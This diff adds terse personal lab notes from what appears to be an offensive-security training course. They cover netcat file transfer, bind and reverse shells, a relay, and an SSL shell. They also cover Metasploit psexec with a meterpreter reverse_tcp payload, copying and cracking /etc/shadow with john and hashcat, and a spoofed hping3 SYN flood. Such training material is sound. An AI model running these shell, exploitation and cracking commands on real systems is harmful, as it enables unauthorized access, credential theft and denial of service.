@@ -137,6 +137,146 @@ PS > Invoke-LocalPasswordSpray -Password Winter2019
 
 
 
+Lab 3.1
+
+#----netcat---#
+
+---pull file (listener sends shit)----
+> echo thisistext > text.txt
+> nc -l -p 1234 < text.txt
+$ nc 10.10.0.1 1234 > received.txt
+$ cat received.txt
+
+
+
+
+----push file (listener wants shit)------ 
+$ echo sans > file.txt
+> nc -l -p 4321 > received2.txt
+$ nc 10.10.0.1 4321 < file.txt
+> type received2.txt
+
+---create bd-----
+
+$ nc -l -p 7777 -e /bin/sh (shovel shell to attacker)
+> nc 10.10.75.1 7777 (attacker)
+> whoami
+> pwd
+> id
+
+---reverse shell----
+
+$ nc -l -p 8888
+> nc 10.10.75.1 8888 -e cmd.exe (shovels cmd to *nix attkr)
+$> dir
+$> echo %username%
+
+----relay----
+ 
+> nc -l -p 54321 -e cmd.exe
+$ mknod backpipe p 
+$ nc -l -p 11111 0<backpipe | nc 10.10.0.1 54321 1>backpipe
+#---another terminal/client---#
+$ nc 127.0.0.1 11111
+$> dir/whoami/hostname
+
+-ncat send files-
+$ echo “b00bs” > file.txt
+$ ncat -l -p 8888 < file.txt
+> ncat 10.10.75.1 > file.txt
+> type file.txt
+
+#--Ncat+ssl---#
+
+$ ncat --ssl -l 443 -e /bin/sh
+$ tcpdump -s0 -X -i eth0 port 443
+
+
+Lab 3.2
+
+#---arp/mac analysis---#
+
+
+Find the weird address in alices arp table
+Check macs on the arp table
+Check switch table 
+Correlate with asset inventory
+
+3.4 --metasploit----
+
+# msfconsole -q
+msf5> show exploits
+msf5> search type:exploit psexec
+msf5> ls
+msf5> info exploit/windows/smb/psexec
+msf5> use exploit/windows/smb/psexec
+msf5> set PAYLOAD windows/meterpreter/reverse_tcp
+msf5> set RHOST  10.10.0.1
+msf5> set SMBUSER sec504
+msf5> set SMBPASS sec504
+msf5> exploit
+mtprt> bg
+mtprt> sessions -l (find tht sesh)
+mtprt> sessions -i 1 (exploit to get back to sesh)
+mtprt> sysinfo/getuid/ps/getpid	
+
+>>>>meterpreter pull hashes from registry stored in the FS (not memory)<<<<<<<
+
+mtprt> migrate -N lsass.exe
+Win--
+> netstat -nao | findstr “EST”
+> tasklist /fi “pid eq PID”
+> wmic process where processid=PID get name
+
+
+
+
+
+
+
+
+
+Lab 4:
+
+#--johnnnyyyy---#
+
+Focus: create accounts + see how quick john is to crack
+/sbin/nologin - limit login 
+
+# cp /etc/passwd /tmp/passwd_copy
+# cp /etc/shadow /tmp/shadow_copy
+# unshadow /tmp/passwd_copy /tmp/shadow_copy > /tmp/combined
+# less /tmp/combined
+# less /opt/john{tab}/run/password.lst
+# john /tmp/combined
+# deluser [homer]
+
+4.2 ----hashcat----
+
+-a [wordlist attack]
+-m [hash type 3000 is lanman]
+-r [rules file]
+
+> hashcat64.exe -a 0 -m 3000 -r rules\Incisive-leetspeak.rule sam.txt password.lst
+> hashcat64.exe -a 0 -m 0 -r rules\Incisive-leetspeak.rule md5.txt password.lst
+
+
+XSS:
+user input reflected in browser
+
+reflected xss: mal URL + delivery + callback 
+
+Lab 4.5:
+Dos
+
+> netsh advfirewall set allprofiles state off
+> for /L %i in (1,1,20) do @notepad.exe
+> tasklist | find /i /c “notepad.exe”
+> wmic process where name=”notepad.exe” delete
+
+# hping3 --syn --count 20 --spoof 10.10.11.11 -p 445 10.10.0.1 
+
+
 
 
 
